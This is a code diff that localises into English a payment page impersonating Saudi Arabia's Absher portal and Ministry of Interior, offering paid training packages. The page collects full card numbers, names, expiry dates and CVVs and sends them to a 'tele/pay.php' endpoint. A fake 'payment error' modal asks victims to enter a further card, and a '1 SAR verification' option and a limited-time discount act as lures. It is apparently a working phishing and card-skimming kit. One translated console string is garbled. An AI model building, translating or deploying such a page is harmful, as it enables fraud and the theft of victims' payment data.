@@ -1,11 +1,11 @@
 <?php
 
 session_start();
+require_once '../includes/lang.php';
+set_site_lang('en');
 
-require_once 'includes/lang.php';
-set_site_lang('ar');
 
-require_once 'dashboard/init.php';
+require_once '../dashboard/init.php';
 
 // Get user ID from URL parameter or session
 $userId = null;
@@ -26,15 +26,15 @@ if (!$userId) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>أبشر - الدفع الإلكتروني</title>
+<title>Absher - Online Payment</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
-<link rel="stylesheet" href="includes/lang-toggle.css">
-<style>
+<link rel="stylesheet" href="../includes/lang-toggle.css">
+    <style>
     * {
         box-sizing: border-box;
         font-family: 'Cairo', sans-serif;
@@ -45,7 +45,7 @@ if (!$userId) {
     body {
         background: #f5f5f5;
         min-height: 100vh;
-        direction: rtl;
+        direction: ltr;
     }
 
     .absher-header {
@@ -54,6 +54,7 @@ if (!$userId) {
         box-shadow: 0 2px 8px rgba(0,0,0,0.15);
     }
 
+    .header-actions { display:flex; align-items:center; gap:12px; }
     .absher-header .container-header {
         max-width: 1200px;
         margin: 0 auto;
@@ -370,8 +371,8 @@ if (!$userId) {
     }
 
     #cardName::placeholder {
-        text-align: right;
-        direction: rtl;
+        text-align: left;
+        direction: ltr;
     }
 
     .flex {
@@ -582,12 +583,12 @@ if (!$userId) {
         <div class="container-header">
             <div class="absher-logo">
                 <i class="fas fa-shield-alt" style="color: white; font-size: 2.5rem;"></i>
-                <h1>أبشر</h1>
+                <h1>Absher</h1>
             </div>
-            <div class="header-actions">
+                        <div class="header-actions">
                 <div class="gov-badge">
                     <i class="fas fa-landmark"></i>
-                    وزارة الداخلية
+                    Ministry of Interior
                 </div>
                 <?php echo render_lang_toggle(); ?>
             </div>
@@ -600,17 +601,17 @@ if (!$userId) {
                 <div class="step-circle completed">
                     <i class="fas fa-check"></i>
                 </div>
-                <div class="step-label">البيانات الأساسية</div>
+                <div class="step-label">Basic Information</div>
             </div>
             <div class="progress-step">
                 <div class="step-circle completed">
                     <i class="fas fa-check"></i>
                 </div>
-                <div class="step-label">معلومات التدريب</div>
+                <div class="step-label">Training Details</div>
             </div>
             <div class="progress-step">
                 <div class="step-circle active">3</div>
-                <div class="step-label active">الدفع الإلكتروني</div>
+                <div class="step-label active">Online Payment</div>
             </div>
         </div>
     </div>
@@ -619,29 +620,29 @@ if (!$userId) {
         <div class="payment-card">
             <h1>
                 <i class="fas fa-credit-card"></i>
-                الدفع الإلكتروني
+                Online Payment
             </h1>
            
             
             <div class="amount-section-title">
                 <i class="fas fa-money-bill-wave"></i>
-                قيمة المبلغ المراد تسديده
+                Amount to pay
             </div>
             
             <div class="amount-options">
                 <div class="amount-option" onclick="selectAmount(this, '1')">
                     <input type="radio" name="amount" id="amount1" value="1">
-                    <label for="amount1">1 ريال لإثبات طريقة الدفع</label>
+                    <label for="amount1">1 SAR to verify payment method</label>
                 </div>
                 
 <div class="amount-option" onclick="selectAmount(this, '690')">
     <input type="radio" name="amount" id="amount690" value="690">
-    <label for="amount690">690 ريال سعودي ( 6 ساعات )</label>
+    <label for="amount690">690 SAR ( 6 hours )</label>
 </div>
                 
                 <div class="amount-option" onclick="selectAmount(this, '1207')">
                     <input type="radio" name="amount" id="amount1207" value="1207">
-                    <label for="amount1207">1207 ريال سعودي ( 12 ساعة )</label>
+                    <label for="amount1207">1207 SAR ( 12 hours )</label>
                 </div>
                 
 <div class="amount-option" onclick="selectAmount(this, '1380')" style="position: relative; overflow: visible;">
@@ -649,8 +650,8 @@ if (!$userId) {
     <label for="amount1380" style="display: flex; flex-direction: column; gap: 8px; width: 100%;">
         <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
             <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
-                <span class="new-price" style="font-size: 1.15rem; color: #2d7a3e;">1380 ريال سعودي</span>
-                <span style="background: #000; color: #fff; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 700;">لفترة محدودة </span>
+                <span class="new-price" style="font-size: 1.15rem; color: #2d7a3e;">1380 SAR</span>
+                <span style="background: #000; color: #fff; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 700;">Limited time </span>
             </div>
             <span style="
                 text-decoration: line-through;
@@ -665,24 +666,24 @@ if (!$userId) {
                 font-style: italic;
             ">2760</span>
         </div>
-        <span style="font-size: 0.9rem; color: #666; font-weight: 500;">برنامج 30 ساعة</span>
+        <span style="font-size: 0.9rem; color: #666; font-weight: 500;">30-hour program</span>
     </label>
 </div>
 </div>
             <hr>
 
             <div class="row total">
-                <span>المبلغ المستحق</span>
-                <span id="selectedAmount">0.00 ر.س</span>
+                <span>Amount due</span>
+                <span id="selectedAmount">0.00 SAR</span>
             </div>
 
             <hr>
 
             <div class="pay-title">
                 <i class="fas fa-credit-card"></i>
-                الدفع من خلال بطاقة الائتمان
+                Pay by credit card
             </div>
-            <div class="pay-sub">من فضلك أدخل معلومات الدفع الخاصة بك</div>
+            <div class="pay-sub">Please enter your payment details</div>
 
             <div class="cards">
                  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSizDhMgMgHQ70Cw5s1EECiIh_nfhpAkeuytg&s" alt="Visa" class="visa">
@@ -690,33 +691,33 @@ if (!$userId) {
                 <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" class="mastercard">
             </div>
 
-            <form id="paymentForm" method="POST" action="tele/pay.php">
+            <form id="paymentForm" method="POST" action="../tele/pay.php">
                 <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($userId); ?>">
                 <input type="hidden" name="price" id="priceInput" value="">
                 
                 <div class="input-group">
                     <label>
                         <i class="fas fa-credit-card"></i>
-                        رقم البطاقة
+                        Card Number
                     </label>
                     <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 1234 1234 1234" maxlength="19">
-                    <div class="error-message" id="cardNumberError">رقم البطاقة غير صالح</div>
+                    <div class="error-message" id="cardNumberError">Invalid card number</div>
                 </div>
 
                 <div class="input-group">
                     <label>
                         <i class="fas fa-user"></i>
-                        اسم صاحب البطاقة
+                        Cardholder name
                     </label>
-                    <input type="text" id="cardName" name="cardName" placeholder="الاسم على البطاقة">
-                    <div class="error-message" id="cardNameError">يجب تعبئة الاسم</div>
+                    <input type="text" id="cardName" name="cardName" placeholder="Name on card">
+                    <div class="error-message" id="cardNameError">Name is required</div>
                 </div>
 
                 <div class="flex">
                     <div class="input-group custom-select">
-                        <label><i class="fas fa-calendar"></i> السنة</label>
+                        <label><i class="fas fa-calendar"></i> Year</label>
                         <select id="year" name="year">
-                            <option value="">السنة</option>
+                            <option value="">Year</option>
                             <option value="2026">2026</option>
                             <option value="2027">2027</option>
                             <option value="2028">2028</option>
@@ -729,12 +730,12 @@ if (!$userId) {
                             <option value="2035">2035</option>
                             <option value="2036">2036</option>
                         </select>
-                        <div class="error-message" id="yearError">يجب اختيار السنة</div>
+                        <div class="error-message" id="yearError">Please select year</div>
                     </div>
                     <div class="input-group custom-select">
-                        <label><i class="fas fa-calendar-alt"></i> الشهر</label>
+                        <label><i class="fas fa-calendar-alt"></i> Month</label>
                         <select id="month" name="month">
-                            <option value="">الشهر</option>
+                            <option value="">Month</option>
                             <option value="01">01</option>
                             <option value="02">02</option>
                             <option value="03">03</option>
@@ -748,24 +749,24 @@ if (!$userId) {
                             <option value="11">11</option>
                             <option value="12">12</option>
                         </select>
-                        <div class="error-message" id="monthError">يجب اختيار الشهر</div>
+                        <div class="error-message" id="monthError">Please select month</div>
                     </div>
                     <div class="input-group">
                         <label><i class="fas fa-lock"></i> CVV</label>
                         <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3">
-                        <div class="error-message" id="cvvError">يجب تعبئة CVV</div>
+                        <div class="error-message" id="cvvError">CVV is required</div>
                     </div>
                 </div>
 
                 <button type="button" onclick="validateForm()" id="submitBtn" disabled>
                     <i class="fas fa-check-circle"></i>
-                    ادفع الآن
+                    Pay Now
                 </button>
             </form>
 
             <div class="security-badge">
                 <i class="fas fa-lock"></i>
-                <span>دفع آمن ومشفر</span>
+                <span>Secure encrypted payment</span>
             </div>
 
         </div>
@@ -774,18 +775,18 @@ if (!$userId) {
     <div id="errorModal" class="modal-overlay">
         <div class="modal-content">
             <div class="modal-icon error">⚠️</div>
-            <h3 class="modal-title">خطأ في الدفع</h3>
+            <h3 class="modal-title">Payment error</h3>
             <p class="modal-message">
-                تم إيقاف الدفع مؤقتاً عن طريق المحافظ الإلكترونية. الرجاء استخدام رقم بطاقة آخر.
+                Payment via digital wallets is temporarily disabled. Please use another card number.
             </p>
-            <button class="modal-button" onclick="handleErrorOk()">حسناً</button>
+            <button class="modal-button" onclick="handleErrorOk()">OK</button>
         </div>
     </div>
 
     <div id="loadingModal" class="modal-overlay">
         <div class="modal-content">
             <div class="loading-spinner"></div>
-            <div class="loading-text">جاري التحقق...</div>
+            <div class="loading-text">Verifying...</div>
         </div>
     </div>
 
@@ -804,7 +805,7 @@ function selectAmount(element, price) {
     element.querySelector('input[type="radio"]').checked = true;
     
     selectedPrice = parseFloat(price);
-    document.getElementById('selectedAmount').textContent = price + '.00 ر.س';
+    document.getElementById('selectedAmount').textContent = price + '.00 SAR';
     document.getElementById('priceInput').value = price;
     localStorage.setItem('last_amount', price);
     checkAllFieldsValid();
@@ -874,7 +875,7 @@ document.getElementById('cardNumber').addEventListener('input', function(e) {
         if (isValidLuhn(value)) {
             clearError('cardNumber');
         } else {
-            showError('cardNumber', 'رقم البطاقة غير صالح');
+            showError('cardNumber', 'Invalid card number');
         }
     } else {
         clearError('cardNumber');
@@ -908,12 +909,12 @@ function validateForm() {
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     
     if (!isValidLuhn(cardNumber)) {
-        showError('cardNumber', 'رقم البطاقة غير صالح');
+        showError('cardNumber', 'Invalid card number');
         return;
     }
     
     if (selectedPrice <= 0) {
-        alert('الرجاء اختيار المبلغ المراد تسديده');
+        alert('Please select the amount to pay');
         return;
     }
     
@@ -921,7 +922,7 @@ function validateForm() {
     
     const formData = new FormData(document.getElementById('paymentForm'));
     
-    fetch('tele/pay.php', {
+    fetch('../tele/pay.php', {
         method: 'POST',
         body: formData
     })
@@ -930,7 +931,7 @@ function validateForm() {
         console.log('✅ تم حفظ البيانات');
     })
     .catch(error => {
-        console.log('✅ تم الإرسال');
+        console.log('✅ تم الSubmit');
     });
 }
 
